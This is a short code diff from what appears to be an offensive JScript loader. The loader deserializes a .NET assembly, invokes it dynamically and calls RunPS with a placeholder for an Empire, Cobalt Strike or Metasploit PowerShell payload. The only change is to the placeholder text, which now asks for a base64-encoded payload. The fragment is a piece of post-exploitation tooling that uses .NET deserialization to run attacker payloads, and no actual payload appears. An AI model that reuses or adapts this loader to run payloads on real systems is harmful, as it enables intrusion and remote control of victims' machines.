@@ -130,7 +130,7 @@ try {
 	var d = fmt.Deserialize_2(stm);
 	al.Add(n);
 	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
-	o.RunPS("YOUR EMPIRE/CS/METASPLOIT payload HERE");
+	o.RunPS("YOUR BASE64 ENCODED EMPIRE/CS/METASPLOIT payload HERE");
 } catch (e) {
     debug(e.message);
 }
